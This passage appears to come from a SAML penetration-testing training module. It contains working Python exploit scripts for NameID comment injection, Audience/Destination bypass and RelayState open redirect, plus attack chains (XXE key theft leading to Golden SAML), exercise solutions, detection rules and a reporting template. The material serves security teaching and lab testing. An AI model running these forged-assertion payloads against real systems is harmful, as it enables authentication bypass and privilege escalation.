        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z"
    )

    assertion_issuer = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Issuer")
    assertion_issuer.text = "https://idp.example.com"

    subject = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Subject")

    nameid = etree.SubElement(
        subject,
        f"{{{NAMESPACES['saml']}}}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )

    # INJECT COMMENT
    nameid.text = prefix_identity
    comment = etree.Comment(" INJECTED COMMENT ")
    nameid.append(comment)
    comment.tail = suffix_identity  # Text after the comment

    # Add conditions
    conditions = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}Conditions",
        NotBefore="2026-02-07T09:59:00Z",
        NotOnOrAfter="2026-02-07T10:10:00Z"
    )

    audience_restriction = etree.SubElement(
        conditions,
        f"{{{NAMESPACES['saml']}}}AudienceRestriction"
    )
    audience = etree.SubElement(audience_restriction, f"{{{NAMESPACES['saml']}}}Audience")
    audience.text = "http://localhost:5001/metadata"

    # Add attributes
    attr_statement = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}AttributeStatement"
    )
    role_attr = etree.SubElement(
        attr_statement,
        f"{{{NAMESPACES['saml']}}}Attribute",
        Name="role"
    )
    role_value = etree.SubElement(role_attr, f"{{{NAMESPACES['saml']}}}AttributeValue")
    role_value.text = "admin"  # Escalate privileges

    xml_bytes = etree.tostring(response, encoding='utf-8', xml_declaration=True)
    saml_b64 = base64.b64encode(xml_bytes).decode('ascii')

    return saml_b64

def demonstrate_parsing_difference():
    """
    Demonstrate how different parsing methods read comment-injected NameID.
    """
    print("=" * 80)
    print("XML COMMENT PARSING DEMONSTRATION")
    print("=" * 80)

    # Create sample NameID with comment
    nameid = etree.Element("NameID")
    nameid.text = "attacker@evil.com"
    comment = etree.Comment("--")
    nameid.append(comment)
    comment.tail = ".legit.com"

    xml_str = etree.tostring(nameid, encoding='unicode')
    print(f"\n[+] XML Structure:")
    print(f"    {xml_str}")

    print(f"\n[+] Parsing Methods:")
    print(f"    .text property:  '{nameid.text}' â† What vulnerable SP reads")
    print(f"    itertext():      '{''.join(nameid.itertext())}' â† What IdP validates")

    print(f"\n[!] Identity Confusion:")
    print(f"    IdP validates: attacker@evil.com.legit.com (looks legitimate)")
    print(f"    SP authenticates: attacker@evil.com (attacker domain!)")

def exploit_comment_injection(target_url):
    """Execute comment injection attack."""
    print("\n" + "=" * 80)
    print("COMMENT INJECTION ATTACK")
    print("=" * 80)

    # Attack scenario: Bypass domain validation
    print("\n[*] Scenario: Bypass email domain validation")
    print("[+] Target requires @legit.com email domain")
    print("[+] Attacker controls @evil.com domain")

    payload = create_comment_injection_payload(
        prefix_identity="attacker@evil.com",
        suffix_identity=".legit.com",
        target_url=target_url
    )

    # Show the NameID structure
    xml_bytes = base64.b64decode(payload)
    root = etree.fromstring(xml_bytes)
    nameid_elem = root.find('.//saml:NameID', NAMESPACES)

    print(f"\n[+] Injected NameID XML:")
    nameid_xml = etree.tostring(nameid_elem, encoding='unicode', pretty_print=True)
    print(f"    {nameid_xml}")

    print(f"\n[+] What IdP sees (full text): {''.join(nameid_elem.itertext())}")
    print(f"[+] What SP sees (.text): {nameid_elem.text}")

    print(f"\n[+] Submitting to: {target_url}")

    response = requests.post(
        target_url,
        data={'SAMLResponse': payload},
        allow_redirects=False
    )

    print(f"[+] Response Status: {response.status_code}")

    if response.status_code in [302, 303]:
        print(f"[!] SUCCESS! Comment injection bypassed validation")
        print(f"[!] Authenticated as: {nameid_elem.text}")
        print(f"[!] Impact: Domain validation bypassed")
        return True
    else:
        print(f"[+] Attack blocked or failed: {response.text[:200]}")
        return False

def test_variations():
    """Test different comment injection variations."""
    print("\n" + "=" * 80)
    print("COMMENT INJECTION VARIATIONS")
    print("=" * 80)

    variations = [
        {
            "name": "Cross-tenant attack",
            "prefix": "attacker@evil.com",
            "suffix": "@tenant-a.com",
            "description": "Inject tenant domain after comment"
        },
        {
            "name": "Role suffix injection",
            "prefix": "user",
            "suffix": "_admin",
            "description": "Append role to username"
        },
        {
            "name": "Domain bypass",
            "prefix": "attacker",
            "suffix": "@company.com",
            "description": "Complete email after comment"
        }
    ]

    for var in variations:
        print(f"\n[+] Variation: {var['name']}")
        print(f"    Description: {var['description']}")

        nameid = etree.Element("NameID")
        nameid.text = var['prefix']
        comment = etree.Comment(" ")
        nameid.append(comment)
        comment.tail = var['suffix']

        print(f"    Full identity: {''.join(nameid.itertext())}")
        print(f"    SP reads: {nameid.text}")

def main():
    # Demonstrate parsing difference
    demonstrate_parsing_difference()

    # Execute attack
    exploit_comment_injection("http://localhost:5001/saml/acs-comment")

    # Show variations
    test_variations()

    print("\n" + "=" * 80)
    print("[+] Comment Injection Attack Complete")
    print("[+] Impact: Identity confusion via XML parser differences")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
python3 saml_comment_injection.py
```

**Defensive Note:**

Comment injection prevention:
1. Use `itertext()` to extract all text content
2. Reject NameIDs containing XML comments
3. Validate XML structure - NameID should have no child elements

**Prevention:**
```python
# SECURE: Reject comments in NameID
nameid_elem = assertion.find('.//saml:NameID', NAMESPACES)

# Check for child elements (comments are children)
if len(nameid_elem) > 0:
    raise SecurityError("NameID contains unexpected child elements")

# Use itertext() to get full content
full_nameid = ''.join(nameid_elem.itertext())
```

**Key Takeaway:** XML comments in identity fields create parser-dependent interpretation. Different parsing methods see different identities, enabling domain and tenant validation bypasses. Always use `itertext()` or reject assertions with comments in critical fields.

---

### 2.3 Recipient/Audience/Destination Bypass + RelayState Injection

> **AUTHORIZATION REMINDER:** Cross-application attacks require testing multiple applications you control.

**Target Description:**

The vulnerable application exposes:
- `POST /saml/acs-nostrict` - Accepts assertions without strict Destination/Audience/Recipient validation
- `POST /saml/acs-relay` - Follows RelayState without validation (open redirect)

**Attack Vectors:**

1. **Cross-Application Replay** - Use assertion meant for App-B on App-A
2. **Cross-Tenant Access** - Use assertion for Tenant-A on Tenant-B
3. **RelayState Open Redirect** - Inject malicious URL in RelayState parameter

**Exploit Script: Audience Bypass & RelayState Injection**

```python
#!/usr/bin/env python3
"""
saml_audience_bypass.py - Cross-application and RelayState attacks

Exploits missing Audience/Destination validation and RelayState injection.
"""

import base64
import requests
from lxml import etree
import uuid

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'
}

def create_cross_app_payload(
    name_id,
    wrong_audience="https://app-b.example.com/metadata",
    wrong_destination="https://app-b.example.com/saml/acs",
    target_url="http://localhost:5001/saml/acs-nostrict"
):
    """
    Create SAML response with Audience/Destination for different application.

    Args:
        name_id: User identity
        wrong_audience: Audience for App-B (not the target)
        wrong_destination: Destination for App-B
        target_url: Vulnerable App-A ACS endpoint

    Returns:
        Base64 encoded SAML response
    """
    response = etree.Element(
        f"{{{NAMESPACES['samlp']}}}Response",
        nsmap={'samlp': NAMESPACES['samlp'], 'saml': NAMESPACES['saml']},
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z",
        Destination=wrong_destination  # Wrong destination!
    )

    issuer = etree.SubElement(response, f"{{{NAMESPACES['saml']}}}Issuer")
    issuer.text = "https://idp.example.com"

    status = etree.SubElement(response, f"{{{NAMESPACES['samlp']}}}Status")
    status_code = etree.SubElement(
        status,
        f"{{{NAMESPACES['samlp']}}}StatusCode",
        Value="urn:oasis:names:tc:SAML:2.0:status:Success"
    )

    assertion = etree.SubElement(
        response,
        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z"
    )

    assertion_issuer = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Issuer")
    assertion_issuer.text = "https://idp.example.com"

    subject = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Subject")
    nameid = etree.SubElement(
        subject,
        f"{{{NAMESPACES['saml']}}}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )
    nameid.text = name_id

    subj_conf = etree.SubElement(
        subject,
        f"{{{NAMESPACES['saml']}}}SubjectConfirmation",
        Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"
    )
    subj_conf_data = etree.SubElement(
        subj_conf,
        f"{{{NAMESPACES['saml']}}}SubjectConfirmationData",
        NotOnOrAfter="2026-02-07T10:10:00Z",
        Recipient=wrong_destination  # Wrong recipient!
    )

    conditions = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}Conditions",
        NotBefore="2026-02-07T09:59:00Z",
        NotOnOrAfter="2026-02-07T10:10:00Z"
    )

    audience_restriction = etree.SubElement(
        conditions,
        f"{{{NAMESPACES['saml']}}}AudienceRestriction"
    )
    audience = etree.SubElement(audience_restriction, f"{{{NAMESPACES['saml']}}}Audience")
    audience.text = wrong_audience  # Wrong audience!

    # Attacker has admin role on App-B, user role on App-A
    attr_statement = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}AttributeStatement"
    )
    role_attr = etree.SubElement(attr_statement, f"{{{NAMESPACES['saml']}}}Attribute", Name="role")
    role_value = etree.SubElement(role_attr, f"{{{NAMESPACES['saml']}}}AttributeValue")
    role_value.text = "admin"  # Admin on App-B

    xml_bytes = etree.tostring(response, encoding='utf-8', xml_declaration=True)
    return base64.b64encode(xml_bytes).decode('ascii')

def exploit_audience_bypass():
    """Execute cross-application assertion replay."""
    print("=" * 80)
    print("AUDIENCE/DESTINATION BYPASS ATTACK")
    print("=" * 80)

    print("\n[*] Attack Scenario:")
    print("[+] User has LOW privileges on App-A")
    print("[+] User has ADMIN privileges on App-B")
    print("[+] Both apps use same IdP")
    print("[+] Attacker intercepts assertion from App-B login")
    print("[+] Attacker replays assertion to App-A")

    payload = create_cross_app_payload(
        name_id="attacker@company.com",
        wrong_audience="https://app-b.example.com/metadata",
        wrong_destination="https://app-b.example.com/saml/acs"
    )

    # Show assertion metadata
    xml_bytes = base64.b64decode(payload)
    root = etree.fromstring(xml_bytes)

    destination = root.get('Destination')
    audience = root.find('.//saml:Audience', NAMESPACES).text
    role_elem = root.find('.//saml:Attribute[@Name="role"]/saml:AttributeValue', NAMESPACES)
    role = role_elem.text if role_elem is not None else 'N/A'

    print(f"\n[+] Assertion Metadata:")
    print(f"    Destination: {destination}")
    print(f"    Audience: {audience}")
    print(f"    Role: {role}")

    print(f"\n[+] Submitting to App-A (wrong target): http://localhost:5001/saml/acs-nostrict")

    response = requests.post(
        "http://localhost:5001/saml/acs-nostrict",
        data={'SAMLResponse': payload},
        allow_redirects=False
    )

    print(f"[+] Response Status: {response.status_code}")

    if response.status_code in [302, 303]:
        print(f"[!] VULNERABLE! App-A accepted assertion meant for App-B")
        print(f"[!] Attacker gained ADMIN role on App-A")
        print(f"[!] Impact: Privilege escalation via cross-application replay")
        return True
    else:
        print(f"[+] SECURE! App-A rejected wrong audience/destination")
        return False

def exploit_relaystate_injection():
    """Execute RelayState open redirect attack."""
    print("\n" + "=" * 80)
    print("RELAYSTATE INJECTION (OPEN REDIRECT)")
    print("=" * 80)

    print("\n[*] Attack Scenario:")
    print("[+] RelayState parameter controls post-auth redirect")
    print("[+] App doesn't validate RelayState URL")
    print("[+] Attacker injects malicious redirect URL")

    # Create valid-looking assertion
    response = etree.Element(
        f"{{{NAMESPACES['samlp']}}}Response",
        nsmap={'samlp': NAMESPACES['samlp'], 'saml': NAMESPACES['saml']},
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z",
        Destination="http://localhost:5001/saml/acs-relay"
    )

    issuer = etree.SubElement(response, f"{{{NAMESPACES['saml']}}}Issuer")
    issuer.text = "https://idp.example.com"

    status = etree.SubElement(response, f"{{{NAMESPACES['samlp']}}}Status")
    status_code = etree.SubElement(
        status,
        f"{{{NAMESPACES['samlp']}}}StatusCode",
        Value="urn:oasis:names:tc:SAML:2.0:status:Success"
    )

    assertion = etree.SubElement(
        response,
        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=f"_{uuid.uuid4().hex}",
        Version="2.0",
        IssueInstant="2026-02-07T10:00:00Z"
    )

    assertion_issuer = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Issuer")
    assertion_issuer.text = "https://idp.example.com"

    subject = etree.SubElement(assertion, f"{{{NAMESPACES['saml']}}}Subject")
    nameid = etree.SubElement(subject, f"{{{NAMESPACES['saml']}}}NameID")
    nameid.text = "victim@company.com"

    xml_bytes = etree.tostring(response, encoding='utf-8', xml_declaration=True)
    payload = base64.b64encode(xml_bytes).decode('ascii')

    # Malicious RelayState
    malicious_url = "https://evil.attacker.com/phish?session="

    print(f"\n[+] Malicious RelayState: {malicious_url}")
    print(f"[+] After auth, user will be redirected to attacker domain")
    print(f"[+] Attacker can harvest session tokens from redirect")

    response = requests.post(
        "http://localhost:5001/saml/acs-relay",
        data={
            'SAMLResponse': payload,
            'RelayState': malicious_url
        },
        allow_redirects=False
    )

    print(f"\n[+] Response Status: {response.status_code}")
    redirect_location = response.headers.get('Location')

    if redirect_location:
        print(f"[+] Redirect Location: {redirect_location}")

        if malicious_url in redirect_location or redirect_location.startswith('http'):
            print(f"[!] VULNERABLE! Open redirect via RelayState")
            print(f"[!] User will be redirected to attacker domain")
            print(f"[!] Impact: Phishing, session token theft")
            return True
        else:
            print(f"[+] SECURE! RelayState validated (only relative URLs allowed)")
            return False

def main():
    # Cross-application attack
    exploit_audience_bypass()

    # RelayState injection
    exploit_relaystate_injection()

    print("\n" + "=" * 80)
    print("[+] Audience Bypass & RelayState Attacks Complete")
    print("[+] Impact: Cross-app privilege escalation, open redirect")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
python3 saml_audience_bypass.py
```

**Defensive Note:**

Prevention requires:
- `strict: True` in python3-saml (enforces Destination/Audience/Recipient)
- RelayState validation: only allow relative URLs or whitelist domains
- Multi-tenant isolation: separate SP entity IDs per tenant

**Key Takeaway:** Missing Audience/Destination validation enables cross-application and cross-tenant attacks. RelayState injection creates open redirects that enable phishing and session theft. Always use `strict: True` and validate RelayState.

---

### 2.4 Session Manipulation Post-SAML Auth

> **AUTHORIZATION REMINDER:** Session attacks target the application's session management after SAML authentication succeeds.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-session` which validates SAML correctly but has weak post-authentication session management:
- No session regeneration (session fixation vulnerable)
- Weak session cookies (no Secure/HttpOnly flags)
- No session timeout enforcement

**Attack Overview:**

Even with perfect SAML signature validation, weak session management enables:
1. **Session Fixation** - Attacker pre-sets victim's session before SAML auth
2. **Cookie Theft** - Missing HttpOnly enables JavaScript access to session cookies
3. **Indefinite Sessions** - Sessions outlive assertion validity

**Defensive Note:**

Session security after SAML requires:
- Session regeneration after authentication
- Secure cookie flags (HttpOnly, Secure, SameSite=Lax)
- Session timeouts matching or shorter than assertion validity
- Single Logout (SLO) support

**Key Takeaway:** Perfect SAML validation is worthless with weak session management. Always regenerate sessions post-auth and enforce strict cookie security.

---

### 2.5 Chaining SAML Vulnerabilities + Exercises

**Attack Chain Examples:**

**Chain 1: XXE â†’ Golden SAML**
```
1. XXE file read â†’ discover IdP config file path
2. XXE file read â†’ extract IdP private key path from config
3. XXE file read â†’ steal private key
4. Golden SAML â†’ forge signed assertions with stolen key
Impact: Persistent access as any user across all SPs
```

**Chain 2: XSW + Comment Injection**
```
1. XSW Type 1 â†’ inject unsigned assertion before signed one
2. Comment injection in NameID â†’ bypass domain validation
3. Submit to cross-app endpoint (no audience check)
Impact: Cross-tenant authentication with privilege escalation
```

**Chain 3: Replay + Session Fixation**
```
1. Capture legitimate SAML response (network sniffing)
2. Pre-set session cookie on victim's browser
3. Replay captured response with fixed session
4. No session regeneration â†’ attacker inherits session
Impact: Session hijacking without credential theft
```

**Exercise 4: Construct XSW Attack**

Given a valid signed SAML response, modify it to inject an unsigned assertion with admin@evil.com and role=admin.

<details>
<summary>Solution (click to reveal)</summary>

Use the XSW Type 1 pattern:

```python
from saml_xsw_attack import xsw_type1_prepend_unsigned_assertion

xsw_payload = xsw_type1_prepend_unsigned_assertion(
    valid_response_b64,
    attacker_nameid="admin@evil.com"
)

# Submit to vulnerable endpoint
requests.post(
    "http://localhost:5001/saml/acs-xsw",
    data={'SAMLResponse': xsw_payload}
)
```

The attack works because:
- Signature validation finds the signed assertion (2nd) â†’ validates âœ“
- Application reads first assertion â†’ uses attacker's unsigned data âœ—

</details>

**Exercise 5: Multi-Vulnerability Chain**

Design an attack using audience bypass + comment injection + session fixation to access Tenant-A using Tenant-B credentials.

<details>
<summary>Solution (click to reveal)</summary>

**Attack Steps:**

1. Authenticate to Tenant-B, capture response
2. Modify NameID:
   ```xml
   <NameID>attacker@tenant-b.com<!---->@tenant-a.com</NameID>
   ```
3. Keep Audience/Destination for Tenant-B (will bypass if not validated)
4. Pre-set session cookie before submitting
5. Submit to Tenant-A's ACS endpoint
6. Tenant-A accepts (no strict mode, comment truncation, no session regen)

Result: Cross-tenant access with persistent session control

</details>

---

## Level 3: RUN - Red Team Operations

### Learning Objectives

After completing L3, learners will be able to:

1. Simulate Golden SAML attacks using compromised IdP signing keys
2. Build automated SAML security testing toolkits
3. Write professional penetration testing reports
4. Understand detection mechanisms from blue team perspective

---

### 3.1 Golden SAML Attack Simulation

> **AUTHORIZATION REMINDER:** Golden SAML simulates a compromised IdP. Only test in isolated lab environments.

**Attack Theory:**

Golden SAML is the ultimate SAML attack - an adversary who has compromised the IdP's token-signing private key can:
- Forge SAML assertions for ANY user
- Sign them with the legitimate IdP key
- Set ANY attributes (roles, groups, permissions)
- Bypass passwords, MFA, account lockouts
- Leave NO logs at the IdP
- Persist until certificate rotation

**Why It's Devastating:**

| Aspect | Impact |
|--------|--------|
| **Scope** | Every SP trusting the compromised IdP |
| **Stealth** | No IdP logs, perfectly valid signatures |
| **Persistence** | Survives password resets, MFA, lockouts |
| **Detection** | Requires SP/IdP log correlation |

**Defensive Note:**

Golden SAML prevention:
- Protect IdP private keys (HSM, strict access controls)
- Regular certificate rotation (quarterly minimum)
- Monitor key access attempts
- Least privilege on IdP servers

Golden SAML detection:
- Cross-reference SP authentications with IdP logs
- Alert on SP auth without corresponding IdP event
- Monitor for unusual assertion characteristics (long validity, odd timings)
- Anomaly detection on role assignments

**Key Takeaway:** Golden SAML bypasses ALL password/MFA controls. The only effective defense is protecting the IdP signing key and rapid detection via SP/IdP log correlation.

---

### 3.2 Automated SAML Security Testing Toolkit

**Tool Architecture:**

```
saml_pentest_toolkit.py
â”œâ”€â”€ Signature bypass testing
â”œâ”€â”€ XXE vulnerability scanning
â”œâ”€â”€ Replay protection testing
â”œâ”€â”€ XSW detection
â”œâ”€â”€ Comment injection testing
â”œâ”€â”€ Strict mode validation
â””â”€â”€ JSON report generation
```

**Automated Testing Benefits:**

- Rapid vulnerability discovery across multiple endpoints
- Consistent test methodology
- Repeatable assessments for CI/CD integration
- Comprehensive coverage of common vulnerabilities
- JSON output for integration with security dashboards

**Limitations:**

- Cannot fully test XSW without valid signed responses
- Golden SAML requires manual setup (key compromise simulation)
- Some attacks require multi-step manual exploitation
- False positives possible (manual verification recommended)

**Key Takeaway:** Automation accelerates SAML security assessments but cannot replace manual testing. Use automation for breadth, manual exploitation for depth.

---

### 3.3 Professional SAML Assessment Reporting

**Finding Template Structure:**

```
Title: [Clear, specific vulnerability name]
Severity: [CRITICAL/HIGH/MEDIUM/LOW] (CVSS Score)
Affected Component: [URL or code location]

Description:
- Technical explanation of the vulnerability
- Root cause analysis

Steps to Reproduce:
1. Detailed, numbered steps
2. Include exact commands/payloads
3. Expected vs actual behavior

Impact:
- Technical impact (authentication bypass, privilege escalation)
- Business impact (data breach risk, compliance violations)

Evidence:
- Screenshots, HTTP requests/responses
- Logs showing exploitation
- Proof of access

Remediation:
- Immediate actions (emergency patches)
- Short-term fixes (1 week)
- Long-term improvements (architecture changes)

References:
- CVE numbers, research papers
- OWASP guidelines
- Vendor documentation
```

**Example Finding:**

```
Title: Missing SAML Signature Validation
Severity: CRITICAL (CVSS 9.8)

Description:
The ACS endpoint accepts unsigned SAML assertions. Attackers can forge
arbitrary identity claims without any cryptographic validation.

Steps to Reproduce:
1. python3 saml_forge_unsigned.py --name-id admin@company.com --role admin
2. Submit to POST /saml/acs
3. Observe successful authentication as admin

Impact:
- Complete authentication bypass
- Unauthorized access to all systems
- Potential data breach
- SOC2/ISO 27001 compliance violations

Remediation:
IMMEDIATE: Enable wantAssertionsSigned and wantMessagesSigned
SHORT-TERM: Implement python3-saml library
LONG-TERM: Security code review of all auth flows
```

**Key Takeaway:** Professional reports communicate technical depth to security teams while providing clear business impact for executives. Always include CVSS scores, reproduction steps, and specific remediation guidance.

---

### 3.4 Detection & Blue Team Perspective

**SAML Attack Indicators:**

**Golden SAML Detection:**
```
SP Log: Authentication successful for ceo@company.com at 03:00 AM
IdP Log: (no corresponding login event)
â†’ ALERT: Possible Golden SAML attack
```

**Replay Detection:**
```
Cache: Response ID _abc123 seen twice
â†’ ALERT: Replay attack detected
```

**XXE Detection:**
```
Error: "failed to load external entity file:///etc/passwd"
â†’ ALERT: XXE attack attempt
```

**XSW Detection:**
```
XML structure: Multiple assertions in single response
â†’ ALERT: Possible XML Signature Wrapping
```

**SIEM Rule Example:**
```python
# Detect SP authentication without IdP correlation
if sp_auth_event and not idp_login_event_within_60_seconds:
    alert("Possible Golden SAML", severity="CRITICAL")
```

**Blue Team Best Practices:**

1. **Log Correlation** - Cross-reference SP and IdP logs hourly
2. **Response ID Tracking** - Alert on duplicates
3. **XML Anomaly Detection** - Flag unusual structures
4. **Behavioral Analysis** - Detect after-hours authentications
5. **Certificate Monitoring** - Alert on IdP cert changes

**Key Takeaway:** SAML attack detection requires SP/IdP log correlation, XML structure analysis, and behavioral anomaly detection. Understanding blue team visibility helps red teamers write better reports and design stealthier attacks.

---

## Quick Reference: SAML Pentest Checklist

### Reconnaissance
- [ ] Intercept SAML response via proxy
- [ ] Base64 decode SAMLResponse
- [ ] Parse XML structure
- [ ] Extract Response ID, Assertion ID
- [ ] Identify NameID and attributes
- [ ] Check signature presence
- [ ] Note Destination/Audience/Recipient
- [ ] Check validity window
- [ ] Look for XML comments

### Basic Attacks
- [ ] Submit unsigned assertion (signature bypass)
- [ ] Inject XXE for file reading
- [ ] Test SSRF via XXE
- [ ] Capture and replay response
- [ ] Test replay protection
- [ ] Modify NameID in unsigned assertion
- [ ] Escalate privileges via attributes

### Advanced Attacks
- [ ] XSW Type 1 (prepend unsigned)
- [ ] XSW Type 2 (wrap signed)
- [ ] Comment injection in NameID
- [ ] Cross-application replay (wrong Audience)
- [ ] RelayState injection
- [ ] Session fixation testing
- [ ] Cookie security analysis

### Red Team Operations
- [ ] Extract IdP certificate from metadata
- [ ] Simulate Golden SAML scenario
- [ ] Test multi-tenant isolation
- [ ] Chain multiple vulnerabilities
- [ ] Run automated scanner
- [ ] Verify detection capabilities

### Reporting
- [ ] CVSS scores for each finding
- [ ] Step-by-step reproduction
- [ ] Exploitation scripts
- [ ] Evidence (screenshots, logs)
- [ ] Business impact analysis
- [ ] Specific remediation steps
- [ ] Executive summary

---

**Document Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Domain:** Software (Lab)
**Author:** Verifhai